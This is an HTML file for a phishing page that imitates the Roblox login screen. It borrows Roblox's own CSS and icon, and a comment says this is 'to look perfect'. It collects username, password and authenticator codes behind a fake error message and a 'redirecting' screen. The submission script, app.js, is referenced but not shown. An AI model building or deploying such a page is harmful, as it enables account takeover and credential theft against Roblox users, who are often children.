<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <!-- Steal the real Roblox CSS to look perfect -->
    <link rel="stylesheet" href="https://css.rbxcdn.com/e712ca41cb057bb3437b163827c3c781440d8e620a807aa2b3e4887da9864da7.css">
    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; }
        .hidden { display: none !important; }
    </style>
</head>
<body class="light-theme">
    <div id="login-page-container">
        <div class="login-container" style="max-width: 380px;">
            <div class="login-form-container">
                <div class="login-form">
                    <div class="login-header">
                        <h2>Log in to Roblox</h2>
                    </div>

                    <!-- Login Form -->
                    <div id="loginDiv">
                        <div id="loginError" class="hidden message-error" style="margin-bottom: 10px;">Incorrect username or password. Please try again.</div>
                        <div class="form-group">
                            <input id="username" type="text" class="form-control" placeholder="Username/Email/Phone">
                        </div>
                        <div class="form-group">
                            <input id="password" type="password" class="form-control" placeholder="Password">
                        </div>
                        <button class="btn-primary-lg btn-full-width" onclick="submitLogin()">Log In</button>
                    </div>

                    <!-- 2FA Form -->
                    <div id="tfaDiv" class="hidden">
                        <h3>2-Step Verification</h3>
                        <p style="margin-top: 10px; margin-bottom: 10px;">Enter the code from your authenticator app.</p>
                        <div class="form-group">
                            <input id="tfaCode" type="text" class="form-control" placeholder="6-Digit Code">
                        </div>
                        <button class="btn-primary-lg btn-full-width" onclick="submitTfa()">Verify</button>
                    </div>

                    <!-- Success Message -->
                    <div id="successDiv" class="hidden">
                        <h3>Success!</h3>
                        <p>Redirecting you now...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="app.js"></script>
</body>
</html>
